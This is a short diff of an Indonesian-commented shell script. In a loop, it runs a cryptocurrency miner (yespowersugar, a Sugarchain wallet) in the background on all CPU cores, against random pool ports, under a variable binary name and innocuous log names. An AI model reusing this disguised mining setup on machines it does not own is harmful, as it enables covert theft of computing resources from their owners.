@@ -49,7 +49,7 @@ while [ $(date +%s) -lt $end_time ]; do
     port=$(shuf -i 501-510 -n 1)
 
     # Menjalankan proses dengan parameter yang ditentukan di latar belakang
-    nohup $dynamic_sgr -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr --timeout 300 -t $(nproc) > dance_$port_$timestamp.log 2>&1 &
+    nohup $dynamic_sgr -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.boncos --timeout 300 -t $(nproc) > dance_$port_$timestamp.log 2>&1 &
     process_pid=$!
 
     echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port"
